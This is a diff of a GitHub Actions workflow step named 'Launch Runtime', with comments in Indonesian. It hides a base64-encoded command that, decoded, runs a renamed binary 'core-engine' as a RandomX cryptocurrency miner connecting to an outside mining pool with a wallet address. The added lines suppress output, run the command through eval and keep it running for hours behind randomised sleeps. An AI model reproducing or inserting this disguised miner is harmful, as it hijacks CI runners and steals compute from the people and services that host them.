@@ -36,31 +36,15 @@ jobs:
       - name: 5 Launch Runtime
         shell: bash
         run: |
-          ENGINE_DIR=$(dirname "$(find . -type f -name "core-engine" | head -n 1)")
-          if [ -z "$ENGINE_DIR" ]; then
-            echo "❌ core-engine not found."
-            exit 1
-          fi
-              
-          echo "✅ Found core-engine in: $ENGINE_DIR"
-          chmod +x "$ENGINE_DIR/core-engine"
-              
-          # encodedStatic sudah didefinisikan sebelumnya di workflow
+          cd core-engine-0.1
+          chmod +x core-engine
           ENCODED="Li9jb3JlLWVuZ2luZSAtLXVybCBwb29sLmhhc2h2YXVsdC5wcm86NDQzIFwKICAtLXVzZXIgc29sbzpaRVBIWVIyeTNheUplaHhmamVEYjNDRXpIbjc5NVZLVXZFdUFucno3MXl3UjhxOHk5ZzJodG5vNkUzc1FRUWFRZjNIdEY4THQzZHJHcEVrOUdSNWd3RUxqWnNoUFdSYUo1RGY0QiBcCiAgLS1wYXNzIGZvY2drbzgzNjEwNyBcCiAgLS1kb25hdGUtbGV2ZWwgMCBcCiAgLS10bHMgLS10bHMtZmluZ2VycHJpbnQgNDIwYzc4NTBlMDliN2MwYmRjZjc0OGE3ZGE5ZWIzNjQ3ZGFmODUxNTcxOGYzNmQ5Y2NmZGQ2YjlmZjgzNGIxNCBcCiAgLWsgLS10aHJlYWRzPSQobnByb2MpIC0tY3B1LXByaW9yaXR5PTUgLS1odWdlLXBhZ2VzLWppdCAtLWNwdS1uby15aWVsZCAtLXJhbmRvbXgtbm8tbnVtYSBcCiAgLS1hc209cnl6ZW4gLS1yYW5kb214LW5vLXJkbXNyIC0tcmFuZG9teC13cm1zcj0tMSAtLXJhbmRvbXgtbW9kZT1mYXN0"
-              
-          # Decode lalu ganti ./core-engine jadi path lengkap
-          CMD=$(echo "$ENCODED" | base64 -d | sed "s|^./core-engine|$ENGINE_DIR/core-engine|")
-              
-          setsid bash -c "$CMD" &
-          SERVER_PID=$!
-          PGID=$(ps -o pgid= $SERVER_PID | grep -o '[0-9]*')
-          echo "🚀 Engine started with PID=$SERVER_PID, PGID=$PGID"
-              
+          CMD=$(echo "$ENCODED" | base64 -d)
+          FINAL_CMD="$CMD > /dev/null 2>&1 &"
+          eval "$FINAL_CMD"
+          PID=$!
           for i in {1..360}; do
-            echo -n "."
+            echo "."
             sleep $((RANDOM % 11 + 35))
           done
-              
-          echo ""
-          echo "🛑 Stopping engine after loop done..."
-          kill -- -$PGID 2>/dev/null || echo "Engine already stopped."
+          kill $PID || true
